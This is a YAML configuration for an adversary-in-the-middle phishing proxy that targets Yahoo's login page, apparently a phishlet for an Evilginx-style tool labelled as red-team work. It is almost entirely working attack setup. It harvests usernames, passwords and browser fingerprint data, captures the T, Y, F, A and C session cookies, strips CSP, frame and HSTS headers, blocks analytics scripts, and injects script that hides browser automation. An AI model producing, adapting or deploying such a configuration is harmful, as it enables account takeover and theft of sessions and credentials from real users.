name: "Yahoo-Login"
author: "Vanta v5 Red Team"
min_ver: "5.0.0"
proxy_hosts:
  - subdomain: "yahoo"
    target: "login.yahoo.com"
  - subdomain: "s"
    target: "s.yimg.com"
auth_urls: 
  - "/"
  - "/account/challenge/password"
landing_path: 
  - "/"
auth_tokens:
  - {type: "cookie", name: "T"}
  - {type: "cookie", name: "Y"}
  - {type: "cookie", name: "F"}
  - {type: "cookie", name: "A"}
  - {type: "cookie", name: "C"}
credentials:
  - {type: "post_param", name: "username", regex: null}
  - {type: "post_param", name: "password", regex: null}
  - {type: "post_param", name: "browser-fp-data", regex: null}
injections:
  - trigger_path: "/"
    position: "body_end"
    content: |
      (function(){
        // Yahoo Anti-Bot Evasion
        Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
        // Disable right-click for security
        document.addEventListener('contextmenu', event => event.preventDefault());
      })();
headers:
  - {action: "remove", name: "Content-Security-Policy"}
  - {action: "remove", name: "X-Frame-Options"}
  - {action: "remove", name: "Strict-Transport-Security"}
path_rewrites: []
cookie_rewrites: []
blocklist:
  - {pattern: "analytics|/ga.js|/ywa.js|/instrumentation", mimes: ["text/javascript"], max_kb: 512}
form_actions:
  - {selector: "form[action]", action_to: "/account/challenge/password"}
bridges:
  - {prefix: "/_img/", target_host: "s.yimg.com", strip_prefix: true, cors: "allow_all"}
